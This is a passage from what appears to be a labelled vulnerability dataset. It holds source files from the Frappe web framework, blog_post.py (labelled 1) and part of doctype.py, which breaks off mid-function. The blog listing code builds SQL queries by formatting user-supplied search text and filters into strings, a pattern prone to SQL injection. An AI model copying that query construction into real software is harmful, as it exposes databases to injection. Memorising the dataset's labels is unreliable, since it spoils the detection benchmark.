"2fa19c25066ed17478d683666895e3266936aee6", "code": "/frappe/website/doctype/blog_post/blog_post.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe\nfrom frappe import _\nfrom frappe.website.website_generator import WebsiteGenerator\nfrom frappe.website.render import clear_cache\nfrom frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\nfrom frappe.website.utils import find_first_image, get_comment_list\n\nclass BlogPost(WebsiteGenerator):\n\twebsite = frappe._dict(\n\t\torder_by = \"published_on desc\"\n\t)\n\n\tdef make_route(self):\n\t\tif not self.route:\n\t\t\treturn frappe.db.get_value('Blog Category', self.blog_category,\n\t\t\t\t'route') + '/' + self.scrub(self.title)\n\n\tdef get_feed(self):\n\t\treturn self.title\n\n\tdef validate(self):\n\t\tsuper(BlogPost, self).validate()\n\n\t\tif not self.blog_intro:\n\t\t\tself.blog_intro = self.content[:140]\n\t\t\tself.blog_intro = strip_html_tags(self.blog_intro)\n\n\t\tif self.blog_intro:\n\t\t\tself.blog_intro = self.blog_intro[:140]\n\n\t\tif self.published and not self.published_on:\n\t\t\tself.published_on = today()\n\n\t\t# update posts\n\t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post`\n\t\t\twhere ifnull(blogger,'')=tabBlogger.name)\n\t\t\twhere name=%s\"\"\", (self.blogger,))\n\n\tdef on_update(self):\n\t\tclear_cache(\"writers\")\n\n\tdef get_context(self, context):\n\t\t# this is for double precaution. usually it wont reach this code if not published\n\t\tif not cint(self.published):\n\t\t\traise Exception(\"This blog has not been published yet!\")\n\n\t\t# temp fields\n\t\tcontext.full_name = get_fullname(self.owner)\n\t\tcontext.updated = global_date_format(self.published_on)\n\n\t\tif self.blogger:\n\t\t\tcontext.blogger_info = frappe.get_doc(\"Blogger\", self.blogger).as_dict()\n\n\t\tcontext.description = self.blog_intro or self.content[:140]\n\n\t\tcontext.metatags = {\n\t\t\t\"name\": self.title,\n\t\t\t\"description\": context.description,\n\t\t}\n\n\t\tif \"<!-- markdown -->\" in context.content:\n\t\t\tcontext.content = markdown(context.content)\n\n\t\timage = find_first_image(self.content)\n\t\tif image:\n\t\t\tcontext.metatags[\"image\"] = image\n\n\t\tcontext.comment_list = get_comment_list(self.doctype, self.name)\n\t\tif not context.comment_list:\n\t\t\tcontext.comment_text = _('No comments yet')\n\t\telse:\n\t\t\tif(len(context.comment_list)) == 1:\n\t\t\t\tcontext.comment_text = _('1 comment')\n\t\t\telse:\n\t\t\t\tcontext.comment_text = _('{0} comments').format(len(context.comment_list))\n\n\t\tcontext.category = frappe.db.get_value(\"Blog Category\",\n\t\t\tcontext.doc.blog_category, [\"title\", \"route\"], as_dict=1)\n\t\tcontext.parents = [{\"name\": _(\"Home\"), \"route\":\"/\"},\n\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"},\n\t\t\t{\"label\": context.category.title, \"route\":context.category.route}]\n\ndef get_list_context(context=None):\n\tlist_context = frappe._dict(\n\t\ttemplate = \"templates/includes/blog/blog.html\",\n\t\tget_list = get_blog_list,\n\t\thide_filters = True,\n\t\tchildren = get_children(),\n\t\t# show_search = True,\n\t\ttitle = _('Blog')\n\t)\n\n\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n\tif category:\n\t\tcategory_title = get_blog_category(category)\n\t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n\t\tlist_context.title = category_title\n\n\telif frappe.local.form_dict.blogger:\n\t\tblogger = frappe.db.get_value(\"Blogger\", {\"name\": frappe.local.form_dict.blogger}, \"full_name\")\n\t\tlist_context.sub_title = _(\"Posts by {0}\").format(blogger)\n\t\tlist_context.title = blogger\n\n\telif frappe.local.form_dict.txt:\n\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n\n\tif list_context.sub_title:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n\t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}]\n\telse:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"}]\n\n\tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True))\n\treturn list_context\n\ndef get_children():\n\treturn frappe.db.sql(\"\"\"select route as name,\n\t\ttitle from `tabBlog Category`\n\t\twhere published = 1\n\t\tand exists (select name from `tabBlog Post`\n\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)\n\t\torder by title asc\"\"\", as_dict=1)\n\ndef clear_blog_cache():\n\tfor blog in frappe.db.sql_list(\"\"\"select route from\n\t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"):\n\t\tclear_cache(blog)\n\n\tclear_cache(\"writers\")\n\ndef get_blog_category(route):\n\treturn frappe.db.get_value(\"Blog Category\", {\"name\": route}, \"title\") or route\n\ndef get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):\n\tconditions = []\n\tif filters:\n\t\tif filters.blogger:\n\t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))\n\t\tif filters.blog_category:\n\t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category))\n\n\tif txt:\n\t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt)))\n\n\tif conditions:\n\t\tfrappe.local.no_cache = 1\n\n\tquery = \"\"\"\\\n\t\tselect\n\t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on,\n\t\t\t\tt1.published_on as creation,\n\t\t\t\tt1.content as content,\n\t\t\t\tifnull(t1.blog_intro, t1.content) as intro,\n\t\t\t\tt2.full_name, t2.avatar, t1.blogger,\n\t\t\t\t(select count(name) from `tabCommunication`\n\t\t\t\t\twhere\n\t\t\t\t\t\tcommunication_type='Comment'\n\t\t\t\t\t\tand comment_type='Comment'\n\t\t\t\t\t\tand reference_doctype='Blog Post'\n\t\t\t\t\t\tand reference_name=t1.name) as comments\n\t\tfrom `tabBlog Post` t1, `tabBlogger` t2\n\t\twhere ifnull(t1.published,0)=1\n\t\tand t1.blogger = t2.name\n\t\t%(condition)s\n\t\torder by published_on desc, name asc\n\t\tlimit %(start)s, %(page_len)s\"\"\" % {\n\t\t\t\"start\": limit_start, \"page_len\": limit_page_length,\n\t\t\t\t\"condition\": (\" and \" + \" and \".join(conditions)) if conditions else \"\"\n\t\t}\n\n\tposts = frappe.db.sql(query, as_dict=1)\n\n\tfor post in posts:\n\t\tpost.cover_image = find_first_image(post.content)\n\t\tpost.published = global_date_format(post.creation)\n\t\tpost.content = strip_html_tags(post.content[:340])\n\t\tif not post.comments:\n\t\t\tpost.comment_text = _('No comments yet')\n\t\telif post.comments==1:\n\t\t\tpost.comment_text = _('1 comment')\n\t\telse:\n\t\t\tpost.comment_text = _('{0} comments').format(str(post.comments))\n\n\t\tpost.avatar = post.avatar or \"\"\n\t\tpost.category = frappe.db.get_value('Blog Category', post.blog_category,\n\t\t\t['route', 'title'], as_dict=True)\n\n\t\tif post.avatar and (not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"):\n\t\t\tpost.avatar = \"/\" + post.avatar\n\n\treturn posts\n/n/n/n", "label": 1}, {"id": "acd2f589b6cd2d1011be4a4e4965a1b3ed489c37", "code": "frappe/core/doctype/doctype/doctype.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport six\n\nimport re, copy, os, subprocess\nimport frappe\nfrom frappe import _\n\nfrom frappe.utils import now, cint\nfrom frappe.model import no_value_fields, default_fields\nfrom frappe.model.document import Document\nfrom frappe.custom.doctype.property_setter.property_setter import make_property_setter\nfrom frappe.desk.notifications import delete_notification_count_for\nfrom frappe.modules import make_boilerplate, get_doc_path\nfrom frappe.model.db_schema import validate_column_name, validate_column_length, type_map\nfrom frappe.model.docfield import supports_translation\nimport frappe.website.render\n\n# imports - third-party imports\nimport pymysql\nfrom pymysql.constants import ER\n\nclass InvalidFieldNameError(frappe.ValidationError): pass\nclass UniqueFieldnameError(frappe.ValidationError): pass\nclass IllegalMandatoryError(frappe.ValidationError): pass\nclass DoctypeLinkError(frappe.ValidationError): pass\nclass WrongOptionsDoctypeLinkError(frappe.ValidationError): pass\nclass HiddenAndMandatoryWithoutDefaultError(frappe.ValidationError): pass\nclass NonUniqueError(frappe.ValidationError): pass\nclass CannotIndexedError(frappe.ValidationError): pass\nclass CannotCreateStandardDoctypeError(frappe.ValidationError): pass\n\nform_grid_templates = {\n\t\"fields\": \"templates/form_grid/fields.html\"\n}\n\nclass DocType(Document):\n\tdef get_feed(self):\n\t\treturn self.name\n\n\tdef validate(self):\n\t\t\"\"\"Validate DocType before saving.\n\n\t\t- Check if developer mode is set.\n\t\t- Validate series\n\t\t- Check fieldnames (duplication etc)\n\t\t- Clear permission table for child tables\n\t\t- Add `amended_from` and `amended_by` if Amendable\"\"\"\n\n\t\tself.check_developer_mode()\n\n\t\tself.validate_name()\n\n\t\tif self.issingle:\n\t\t\tself.allow_import = 0\n\t\t\tself.is_submittable = 0\n\t\t\tself.istable = 0\n\n\t\telif self.istable:\n\t\t\tself.allow_import = 0\n\t\t\tself.permissions = []\n\n\t\tself.scrub_field_names()\n\t\tself.set_default_in_list_view()\n\t\tself.set_default_translatable()\n\t\tself.validate_series()\n\t\tself.validate_document_type()\n\t\tvalidate_fields(self)\n\n\t\tif self.istable:\n\t\t\t# no permission records for child table\n\t\t\tself.permissions = []\n\t\telse:\n\t\t\tvalidate_permissions(self)\n\n\t\tself.make_amendable()\n\t\tself.validate_website()\n\n\t\tif not self.is_new():\n\t\t\tself.before_update = frappe.get_doc('DocType', self.name)\n\n\t\tif not self.is_new():\n\t\t\tself.setup_fields_to_fetch()\n\n\t\tif self.default_print_format and not self.custom:\n\t\t\tfrappe.throw(_('Standard DocType cannot have default print format, use Customize Form'))\n\n\tdef set_default_in_list_view(self):\n\t\t'''Set default in-list-view for first 4 mandatory fields'''\n\t\tif not [d.fieldname for d in self.fields if d.in_list_view]:\n\t\t\tcnt = 0\n\t\t\tfor d in self.fields:\n\t\t\t\tif d.reqd and not d.hidden and not d.fieldtype == \"Table\":\n\t\t\t\t\td.in_list_view = 1\n\t\t\t\t\tcnt += 1\n\t\t\t\t\tif cnt == 4: break\n\n\tdef set_default_translatable(self):\n\t\t'''Ensure that non-translatable never will be translatable'''\n\t\tfor d in self.fields:\n\t\t\tif d.translatable and not supports_translation(d.fieldtype):\n\t\t\t\td.translatable = 0\n\n\tdef check_developer_mode(self):\n\t\t\"\"\"Throw exception if not developer mode or via patch\"\"\"\n\t\tif frappe.flags.in_patch or frappe.flags.in_test:\n\t\t\treturn\n\n\t\tif not frappe.conf.get(\"developer_mode\") and not self.custom:\n\t\t\tfrappe.throw(_(\"Not in Developer Mode! Set in site_config.json or make 'Custom' DocType.\"), CannotCreateStandardDoctypeError)\n\n\tdef setup_fields_to_fetch(self):\n\t\t'''Setup query to update values for newly set fetch values'''\n\t\ttry:\n\t\t\told_meta = frappe.get_meta(frappe.get_doc('DocType', self.name), cached=False)\n\t\t\told_fields_to_fetch = [df.fieldname for df in old_meta.get_fields_to_fetch()]\n\t\texcept frappe.DoesNotExistError:\n\t\t\told_fields_to_fetch = []\n\n\t\tnew_meta = frappe.get_meta(self, cached=False)\n\n\t\tself.flags.update_fields_to_fetch_queries = []\n\n\t\tif set(old_fields_to_fetch) != set([df.fieldname for df in new_meta.get_fields_to_fetch()]):\n\t\t\tfor df in new_meta.get_fields_to_fetch():\n\t\t\t\tif df.fieldname not in old_fields_to_fetch:\n\t\t\t\t\tlink_fieldname, source_fieldname = df.fetch_from.split('.', 1)\n\t\t\t\t\tlink_df = new_meta.get_field(link_fieldname)\n\n\t\t\t\t\tself.flags.update_fields_to_fetch_queries.append('''update\n\t\t\t\t\t\t\t`tab{link_doctype}` source,\n\t\t\t\t\t\t\t`tab{doctype}` target\n\t\t\t\t\t\tset\n\t\t\t\t\t\t\ttarget.`{fieldname}` = source.`{source_fieldname}`\n\t\t\t\t\t\twhere\n\t\t\t\t\t\t\ttarget.`{link_fieldname}` = source.name\n\t\t\t\t\t\t\tand ifnull(target.`{fieldname}`, '')=\"\" '''.format(\n\t\t\t\t\t\t\t\tlink_doctype = link_df.options,\n\t\t\t\t\t\t\t\tsource_fieldname = source_fieldname,\n\t\t\t\t\t\t\t\tdoctype = self.name,\n\t\t\t\t\t\t\t\tfieldname = df.fieldname,\n\t\t\t\t\t\t\t\tlink_fieldname = link_fieldname\n\t\t\t\t\t))\n\n\tdef update_fields_to_fetch(self):\n\t\t'''Update fetch values based on queries setup'''\n\t\tif self.flags.update_fields_to_fetch_queries and not self.issingle:\n\t\t\tfor query in self.flags.update_fields_to_fetch_queries:\n\t\t\t\tfrappe.db.sql(query)\n\n\tdef validate_document_type(self):\n\t\tif self.document_type==\"Transaction\":\n\t\t\tself.document_type = \"Document\"\n\t\tif self.document_type==\"Master\":\n\t\t\tself.document_type = \"Setup\"\n\n\tdef validate_website(self):\n\t\t\"\"\"Ensure that website generator has field 'route'\"\"\"\n\t\tif self.has_web_view:\n\t\t\t# route field must be present\n\t\t\tif not 'route' in [d.fieldname for d in self.fields]:\n\t\t\t\tfrappe.throw(_('Field \"route\" is mandatory for Web Views'), title='Missing Field')\n\n\t\t\t# clear website cache\n\t\t\tfrappe.website.render.clear_cache()\n\n\tdef change_modified_of_parent(self):\n\t\t\"\"\"Change the timestamp of parent DocType if the current one is a child to clear caches.\"\"\"\n\t\tif frappe.flags.in_import:\n\t\t\treturn\n\t\tparent_list = frappe.db.sql(\"\"\"SELECT parent\n\t\t\tfrom tabDocField where fieldtype=\"Table\" and options=%s\"\"\", self.name)\n\t\tfor p in parent_list:\n\t\t\tfrappe.db.sql('UPDATE tabDocType SET modified=%s WHERE `name`=%s', (now(), p[0]))\n\n\tdef scrub_field_names(self):\n\t\t\"\"\"Sluggify fieldnames if not set from Label.\"\"\"\n\t\trestricted = ('name','parent','creation','modified','modified_by',\n\t\t\t'parentfield','parenttype','file_list', 'flags', 'docstatus')\n\t\tfor d in self.get(\"fields\"):\n\t\t\tif d.fieldtype:\n\t\t\t\tif (not getattr(d, \"fieldname\", None)):\n\t\t\t\t\tif d.label:\n\t\t\t\t\t\td.fieldname = d.label.strip().lower().replace(' ','_')\n\t\t\t\t\t\tif d.fieldname in restricted:\n\t\t\t\t\t\t\td.fieldname = d.fieldname + '1'\n\t\t\t\t\t\tif d.fieldtype=='Section Break':\n\t\t\t\t\t\t\td.fieldname = d.fieldname + '_section'\n\t\t\t\t\t\telif d.fieldtype=='Column Break':\n\t\t\t\t\t\t\td.fieldname = d.fieldname + '_column'\n\t\t\t\t\telse:\n\t\t\t\t\t\td.fieldname = d.fieldtype.lower().replace(\" \",\"_\") + \"_\" + str(d.idx)\n\n\t\t\t\td.fieldname = re.sub('''['\",./%@()<>{}]''', '', d.fieldname)\n\n\t\t\t\t# fieldnames should be lowercase\n\t\t\t\td.fieldname = d.fieldname.lower()\n\n\t\t\t# unique is automatically an index\n\t\t\tif d.unique: d.search_index = 0\n\n\tdef validate_series(self, autoname=None, name=None):\n\t\t\"\"\"Validate if `autoname` property is correctly set.\"\"\"\n\t\tif not autoname: autoname = self.autoname\n\t\tif not name: name = self.name\n\n\t\tif not autoname and self.get(\"fields\", {\"fieldname\":\"naming_series\"}):\n\t\t\tself.autoname = \"naming_series:\"\n\n\t\t# validate field name if autoname field:fieldname is used\n\t\t# Create unique index on autoname field automatically.\n\t\tif autoname and autoname.startswith('field:'):\n\t\t\tfield = autoname.split(\":\")[1]\n\t\t\tif not field or field not in [ df.fieldname for df in self.fields ]:\n\t\t\t\tfrappe.throw(_(\"Invalid fieldname '{0}' in autoname\".format(field)))\n\t\t\telse:\n\t\t\t\tfor df in self.fields:\n\t\t\t\t\tif df.fieldname == field:\n\t\t\t\t\t\tdf.unique = 1\n\t\t\t\t\t\tbreak\n\n\t\tif autoname and (not autoname.startswith('field:')) \\\n\t\t\tand (not autoname.startswith('eval:')) \\\n\t\t\tand (not autoname.lower() in ('prompt', 'hash')) \\\n\t\t\tand (not autoname.startswith('naming_series:')):\n\n\t\t\tprefix = autoname.split('.')[0]\n\t\t\tused_in = frappe.db.sql('select name from tabDocType where substring_index(autoname, \".\", 1) = %s and name!=%s', (prefix, name))\n\t\t\tif used_in:\n\t\t\t\tfrappe.throw(_(\"Series {0} already used in {1}\").format(prefix, used_in[0][0]))\n\n\tdef on_update(self):\n\t\t\"\"\"Update database schema, make controller templates if `custom` is not set and clear cache.\"\"\"\n\t\tfrom frappe.model.db_schema import updatedb\n\t\tself.delete_duplicate_custom_fields()\n\t\ttry:\n\t\t\tupdatedb(self.name, self)\n\t\texcept Exception as e:\n\t\t\tprint(\"\\n\\nThere was an issue while migrating the DocType: {}\\n\".format(self.name))\n\t\t\traise e\n\n\t\tself.change_modified_of_parent()\n\t\tmake_module_and_roles(self)\n\n\t\tself.update_fields_to_fetch()\n\n\t\tfrom frappe import conf\n\t\tif not self.custom and not (frappe.flags.in_import or frappe.flags.in_test) and conf.get('developer_mode'):\n\t\t\tself.export_doc()\n\t\t\tself.make_controller_template()\n\n\t\t\tif self.has_web_view:\n\t\t\t\tself.set_base_class_for_controller()\n\n\t\t# update index\n\t\tif not self.custom:\n\t\t\tself.run_module_method(\"on_doctype_update\")\n\t\t\tif self.flags.in_insert:\n\t\t\t\tself.run_module_method(\"after_doctype_insert\")\n\n\t\tdelete_notification_count_for(doctype=self.name)\n\t\tfrappe.clear_cache(doctype=self.name)\n\n\t\tif not frappe.flags.in_install and hasattr(self, 'before_update'):\n\t\t\tself.sync_global_search()\n\n\t\t# clear from local cache\n\t\tif self.name in frappe.local.meta_cache:\n\t\t\tdel frappe.local.meta_cache[self.name]\n\n\t\tclear_linked_doctype_cache()\n\n\tdef delete_duplicate_custom_fields(self):\n\t\tif not (frappe.db.table_exists(self.name) and frappe.db.table_exists(\"Custom Field\")):\n\t\t\treturn\n\t\tfields = [d.fieldname for d in self.fields if d.fieldtype in type_map]\n\t\tfrappe.db.sql('''delete from\n\t\t\t\t`tabCustom Field`\n\t\t\twhere\n\t\t\t\t dt = {0} and fieldname in ({1})\n\t\t'''.format('%s', ', '.join(['%s'] * len(fields))), tuple([self.name] + fields), as_dict=True)\n\n\tdef sync_global_search(self):\n\t\t'''If global search settings are changed, rebuild search properties for this table'''\n\t\tglobal_search_fields_before_update = [d.fieldname for d in\n\t\t\tself.before_update.fields if d.in_global_search]\n\t\tif self.before_update.show_name_in_global_search:\n\t\t\tglobal_search_fields_before_update.append('name')\n\n\t\tglobal_search_fields_after_update = [d.fieldname for d in\n\t\t\tself.fields if d.in_global_search]\n\t\tif self.show_name_in_global_search:\n\t\t\tglobal_search_fields_after_update.append('name')\n\n\t\tif set(global_search_fields_before_update) != set(global_search_fields_after_update):\n\t\t\tnow = (not frappe.request) or frappe.flags.in_test or frappe.flags.in_install\n\t\t\tfrappe.enqueue('frappe.utils.global_search.rebuild_for_doctype',\n\t\t\t\tnow=now, doctype=self.name)\n\n\tdef set_base_class_for_controller(self):\n\t\t'''Updates the controller class to subclass from `WebsiteGenertor`,\n\t\tif it is a subclass of `Document`'''\n\t\tcontroller_path = frappe.get_module_path(frappe.scrub(self.module),\n\t\t\t'doctype', frappe.scrub(self.name), frappe.scrub(self.name) + '.py')\n\n\t\twith open(controller_path, 'r') as f:\n\t\t\tcode = f.read()\n\n\t\tclass_string = '\\nclass {0}(Document)'.format(self.name.replace(' ', ''))\n\t\tif '\\nfrom frappe.model.document import Document' in code and class_string in code:\n\t\t\tcode = code.replace('from frappe.model.document import Document',\n\t\t\t\t'from frappe.website.website_generator import WebsiteGenerator')\n\t\t\tcode = code.replace('class {0}(Document)'.format(self.name.replace(' ', '')),\n\t\t\t\t'class {0}(WebsiteGenerator)'.format(self.name.replace(' ', '')))\n\n\t\twith open(controller_path, 'w') as f:\n\t\t\tf.write(code)\n\n\n\tdef run_module_method(self, method):\n\t\tfrom frappe.modules import load_doctype_module\n\t\tmodule = load_doctype_module(self.name, self.module)\n\t\tif hasattr(module, method):\n\t\t\tgetattr(module, method)()\n\n\tdef before_rename(self, old, new, merge=False):\n\t\t\"\"\"Throw exception if merge. DocTypes cannot be merged.\"\"\"\n\t\tif not self.custom and frappe.session.user != \"Administrator\":\n\t\t\tfrappe.throw(_(\"DocType can only be renamed by Administrator\"))\n\n\t\tself.check_developer_mode()\n\t\tself.validate_name(new)\n\n\t\tif merge:\n\t\t\tfrappe.throw(_(\"DocType can not be merged\"))\n\n\t\t# Do not rename and move files and folders for custom doctype\n\t\tif not self.custom and not frappe.flags.in_test and not frappe.flags.in_patch:\n\t\t\tself.rename_files_and_folders(old, new)\n\n\tdef after_rename(self, old, new, merge=False):\n\t\t\"\"\"Change table name using `RENAME TABLE` if table exists. Or update\n\t\t`doctype` property for Single type.\"\"\"\n\t\tif self.issingle:\n\t\t\tfrappe.db.sql(\"\"\"update tabSingles set doctype=%s where doctype=%s\"\"\", (new, old))\n\t\t\tfrappe.db.sql(\"\"\"update tabSingles set value=%s\n\t\t\t\twhere doctype=%s and field='name' and value = %s\"\"\", (new, new, old))\n\t\telse:\n\t\t\tfrappe.db.sql(\"rename table `tab%s` to `tab%s`\" % (old, new))\n\n\tdef rename_files_and_folders(self, old, new):\n\t\t# move files\n\t\tnew_path = get_doc_path(self.module, 'doctype', new)\n\t\tsubprocess.check_output(['mv', get_doc_path(self.module, 'doctype', old), new_path])\n\n\t\t# rename files\n\t\tfor fname in os.listdir(new_path):\n\t\t\tif frappe.scrub(old) in fname:\n\t\t\t\tsubprocess.check_output(['mv', os.path.join(new_path, fname),\n\t\t\t\t\tos.path.join(new_path, fname.replace(frappe.scrub(old), frappe.scrub(new)))])\n\n\t\tself.rename_inside_controller(new, old, new_path)\n\t\tfrappe.msgprint('Renamed files and replaced code in controllers, please check!')\n\n\tdef rename_inside_controller(self, new, old, new_path):\n\t\tfor fname in ('{}.js', '{}.py', '{}_list.js', '{}_calendar.js', 'test_{}.py', 'test_{}.js'):\n\t\t\tfname = os.path.join(new_path, fname.format(frappe.scrub(new)))\n\t\t\tif os.path.exists(fname):\n\t\t\t\twith open(fname, 'r') as f:\n\t\t\t\t\tcode = f.read()\n\t\t\t\twith open(fname, 'w') as f:\n\t\t\t\t\tf.write(code.replace(frappe.scrub(old).replace(' ', ''), frappe.scrub(new).replace(' ', '')))\n\n\tdef before_reload(self):\n\t\t\"\"\"Preserve naming series changes in Property Setter.\"\"\"\n\t\tif not (self.issingle and self.istable):\n\t\t\tself.preserve_naming_series_options_in_property_setter()\n\n\tdef preserve_naming_series_options_in_property_setter(self):\n\t\t\"\"\"Preserve naming_series as property setter if it does not exist\"\"\"\n\t\tnaming_series = self.get(\"fields\", {\"fieldname\": \"naming_series\"})\n\n\t\tif not naming_series:\n\t\t\treturn\n\n\t\t# check if atleast 1 record exists\n\t\tif not (frappe.db.table_exists(self.name) and frappe.db.sql(\"select name from `tab{}` limit 1\".format(self.name))):\n\t\t\treturn\n\n\t\texisting_property_setter = frappe.db.get_value(\"Property Setter\", {\"doc_type\": self.name,\n\t\t\t\"property\": \"options\", \"field_name\": \"naming_series\"})\n\n\t\tif not existing_property_setter:\n\t\t\tmake_property_setter(self.name, \"naming_series\", \"options\", naming_series[0].options, \"Text\", validate_fields_for_doctype=False)\n\t\t\tif naming_series[0].default:\n\t\t\t\tmake_property_setter(self.name, \"naming_series\", \"default\", naming_series[0].default, \"Text\", validate_fields_for_doctype=False)\n\n\tdef export_doc(self):\n\t\t\"\"\"Export to standard folder `[module]/doctype/[name]/[name].json`.\"\"\"\n\t\tfrom frappe.modules.export_file import export_to_files\n\t\texport_to_files(record_list=[['DocType', self.name]], create_init=True)\n\n\tdef import_doc(self):\n\t\t\"\"\"Import from standard folder `[module]/doctype/[name]/[name].json`.\"\"\"\n\t\tfrom frappe.modules.import_module import import_from_files\n\t\timport_from_files(record_list=[[self.module, 'doctype', self.name]])\n\n\tdef make_controller_template(self):\n\t\t\"\"\"Make boilerplate controller template.\"\"\"\n\t\tmake_boilerplate(\"controller._py\", self)\n\n\t\tif not self.istable:\n\t\t\tmake_boilerplate(\"test_controller._py\", self.as_dict())\n\t\t\tmake_boilerplate(\"controller.js\", self.as_dict())\n\t\t\t#make_boilerplate(\"controller_list.js\", self.as_dict())\n\t\t\tif not os.path.exists(frappe.get_module_path(frappe.scrub(self.module),\n\t\t\t\t'doctype', frappe.scrub(self.name), 'tests')):\n\t\t\t\tmake_boilerplate(\"test_controller.js\", self.as_dict())\n\n\t\tif self.has_web_view:\n\t\t\ttemplates_path = frappe.get_module_path(frappe.scrub(self.module), 'doctype', frappe.scrub(self.name), 'templates')\n\t\t\tif not os.path.exists(templates_path):\n\t\t\t\tos.makedirs(templates_path)\n\t\t\tmake_boilerplate('templates/controller.html', self.as_dict())\n\t\t\tmake_boilerplate('templates/controller_row.html', self.as_dict())\n\n\tdef make_amendable(self):\n\t\t\"\"\"If is_submittable is set, add amended_from docfields.\"\"\"\n\t\tif self.is_submittable:\n\t\t\tif not frappe.db.sql(\"\"\"select name from tabDocField\n\t\t\t\twhere fieldname = 'amended_from' and parent = %s\"\"\", self.name):\n\t\t\t\t\tself.append(\"fields\", {\n\t\t\t\t\t\t\"label\": \"Amended From\",\n\t\t\t\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\t\t\t\"fieldname\": \"amended_from\",\n\t\t\t\t\t\t\"options\": self.name,\n\t\t\t\t\t\t\"read_only\": 1,\n\t\t\t\t\t\t\"print_hide\": 1,\n\t\t\t\t\t\t\"no_copy\": 1\n\t\t\t\t\t})\n\n\tdef get_max_idx(self):\n\t\t\"\"\"Returns the highest `idx`\"\"\"\n\t\tmax_idx = frappe.db.sql(\"\"\"select max(idx) from `tabDocField` where parent = %s\"\"\",\n\t\t\tself.name)\n\t\treturn max_idx and max_idx[0][0] or 0\n\n\tdef validate_name(self, name=None):\n\t\tif not name:\n\t\t\tname = self.name\n\n\t\t# a DocType's name should not start with a number or underscore\n\t\t# and should only contain letters, numbers and underscore\n\t\tif six.PY2:\n\t\t\tis_a_valid_name = re.match(\"^(?![\\W])[^\\d_\\s][\\w ]+$\", name)\n\t\telse:\n\t\t\tis_a_valid_name = re.match(\"^(?![\\W])[^\\d_\\s][\\w ]+$\", name, flags = re.ASCII)\n\t\tif not is_a_valid_name:\n\t\t\tfrappe.throw(_(\"DocType's name should start with a letter and it can only consist of letters, numbers, spaces and underscores\"), frappe.NameError)\n\ndef validate_fields_for_doctype(doctype):\n\tdoc = frappe.get_doc(\"DocType\", doctype)\n\tdoc.delete_duplicate_custom_fields()\n\tvalidate_fields(frappe.get_meta(doctype, cached=False))\n\n# this is separate because it is also called via custom field\ndef validate_fields(meta):\n\t\"\"\"Validate doctype fields. Checks\n\t1. There are no illegal characters in fieldnames\n\t2. If fieldnames are unique.\n\t3. Validate column length.\n\t4. Fields that do have database columns are not mandatory.\n\t5. `Link` and `Table` options are valid.\n\t6. **Hidden** and **Mandatory** are not set simultaneously.\n\t7. `Check` type field has default as 0 or 1.\n\t8. `Dynamic Links` are correctly defined.\n\t9. Precision is set in numeric fields and is between 1 & 6.\n\t10. Fold is not at the end (if set).\n\t11. `search_fields` are valid.\n\t12. `title_field` and title field pattern are valid.\n\t13. `unique` check is only valid for Data, Link and Read Only fieldtypes.\n\t14. `unique` cannot be checked if there exist non-unique values.\n\n\t:param meta: `frappe.model.meta.Meta` object to check.\"\"\"\n\tdef check_illegal_characters(fieldname):\n\t\tvalidate_column_name(fieldname)\n\n\tdef check_unique_fieldname(docname, fieldname):\n\t\tduplicates = list(filter(None, map(lambda df: df.fieldname==fieldname and str(df.idx) or None, fields)))\n\t\tif len(duplicates) > 1:\n\t\t\tfrappe.throw(_(\"{0}: Fieldname {1} appears multiple times in rows {2}\").format(docname, fieldname, \", \".join(duplicates)), UniqueFieldnameError)\n\n\tdef check_fieldname_length(fieldname):\n\t\tvalidate_column_length(fieldname)\n\n\tdef check_illegal_mandatory(docname, d):\n\t\tif (d.fieldtype in no_value_fields) and d.fieldtype!=\"Table\" and d.reqd:\n\t\t\tfrappe.throw(_(\"{0}: Field {1} of type {2} cannot be mandatory\").format(docname, d.label, d.fieldtype), IllegalMandatoryError)\n\n\tdef check_link_table_options(docname, d):\n\t\tif d.fieldtype in (\"Link\", \"Table\"):\n\t\t\tif not d.options:\n\t\t\t\tfrappe.throw(_(\"{0}: Options required for Link or Table type field {1} in row {2}\").format(docname, d.label, d.idx), DoctypeLinkError)\n\t\t\tif d.options==\"[Select]\" or d.options==d.parent:\n\t\t\t\treturn\n\t\t\tif d.options != d.parent:\n\t\t\t\toptions = frappe.db.get_value(\"DocType\", d.options, \"name\")\n\t\t\t\tif not options:\n\t\t\t\t\tfrappe.throw(_(\"{0}: Options must be a valid DocType for field {1} in row {2}\").format(docname, d.label, d.idx), WrongOptionsDoctypeLinkError)\n\t\t\t\telif not (options == d.options):\n\t\t\t\t\tfrappe.throw(_(\"{0}: Options {1} must be the same as doctype name {2} for the field {3}\", DoctypeLinkError)\n\t\t\t\t\t\t.format(docname, d.options, options, d.label))\n\t\t\t\telse:\n\t\t\t\t\t# fix case\n\t\t\t\t\td.options = options\n\n\tdef check_hidden_and_mandatory(docname, d):\n\t\tif d.hidden and d.reqd and not d.default:\n\t\t\tfrappe.throw(_(\"{0}: Field {1} in row {2} cannot be hidden and mandatory without 